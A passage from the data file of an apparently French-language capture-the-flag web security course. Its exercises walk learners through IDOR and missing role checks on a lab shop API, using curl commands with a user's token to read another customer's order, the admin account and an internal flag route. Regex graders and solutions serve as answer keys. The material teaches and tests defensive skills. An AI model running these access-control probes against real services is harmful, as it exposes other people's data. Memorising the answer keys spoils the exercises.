      task: "Appelez <code>/api/v1/orders/1043</code> avec le jeton d'Alice et extrayez le champ <code>note</code>.",
      hint: "Utilisez <code>curl -s -H \"Authorization: Bearer $TOKEN\"</code> puis <code>jq -r '.note'</code>.",
      accept: [/curl\s+-s\s+-H\s+["']Authorization:\s*Bearer\s+\$TOKEN["']\s+http:\/\/shop\.ctf\.lab\/api\/v1\/orders\/1043.*jq\s+-r\s+["']?\.note/i],
      solution: 'curl -s -H "Authorization: Bearer $TOKEN" http://shop.ctf.lab/api/v1/orders/1043 | jq -r ".note"',
      output: ['Commande de démonstration — FLAG{WEB_IDOR_ORDERS}'],
      read: "Le serveur renvoie la commande d'un autre client avec le jeton d'Alice. C'est un IDOR : l'authentification est valide, l'autorisation est absente.",
      pivot: "Documentez l'objet 1042 (légitime) et l'objet 1043 (interdit) avec les deux réponses. La correction est un contrôle de propriété côté serveur."
    },
    {
      id: 'm9-e11',
      title: 'Lire le compte administrateur',
      context: "La route <code>/api/v1/users/1</code> devrait être réservée à l'admin ou au propriétaire.",
      task: "Appelez <code>/api/v1/users/1</code> avec le jeton d'Alice et extrayez le flag.",
      hint: "Même schéma que l'IDOR précédent, avec <code>jq -r '.flag'</code>.",
      accept: [/curl\s+-s\s+-H\s+["']Authorization:\s*Bearer\s+\$TOKEN["']\s+http:\/\/shop\.ctf\.lab\/api\/v1\/users\/1.*jq\s+-r\s+["']?\.flag/i],
      solution: 'curl -s -H "Authorization: Bearer $TOKEN" http://shop.ctf.lab/api/v1/users/1 | jq -r ".flag"',
      output: ['FLAG{WEB_IDOR_USERS}'],
      read: "Alice lit le profil de l'administrateur. L'impact augmente : un attaquant peut récupérer l'e-mail, le rôle et potentiellement d'autres secrets.",
      pivot: "Testez ensuite une route verticale réservée à l'admin. Si elle ne vérifie que le jeton, l'escalade horizontale devient verticale."
    },
    {
      id: 'm9-e12',
      title: 'Capturer le flag final',
      context: "La route <code>/api/v1/internal/flag</code> est réservée à l'administration. Le serveur vérifie-t-il le rôle ?",
      task: "Appelez la route interne avec le jeton d'Alice et extrayez le flag.",
      hint: "Utilisez <code>curl -s -H \"Authorization: Bearer $TOKEN\"</code> et <code>jq -r '.flag'</code>.",
      accept: [/curl\s+-s\s+-H\s+["']Authorization:\s*Bearer\s+\$TOKEN["']\s+http:\/\/shop\.ctf\.lab\/api\/v1\/internal\/flag.*jq\s+-r\s+["']?\.flag/i],
      solution: 'curl -s -H "Authorization: Bearer $TOKEN" http://shop.ctf.lab/api/v1/internal/flag | jq -r ".flag"',
      output: ['FLAG{WEB_APP_OWNED}'],
      read: "La route interne accepte un jeton utilisateur : le contrôle d'accès vertical est absent. C'est le flag final du parcours.",
      pivot: "Rédigez la chaîne complète : en-têtes → backup → endpoints → login → IDOR → route interne. Joignez les preuves et proposez les correctifs."
    }
  ],
  quiz: 'q9'
};
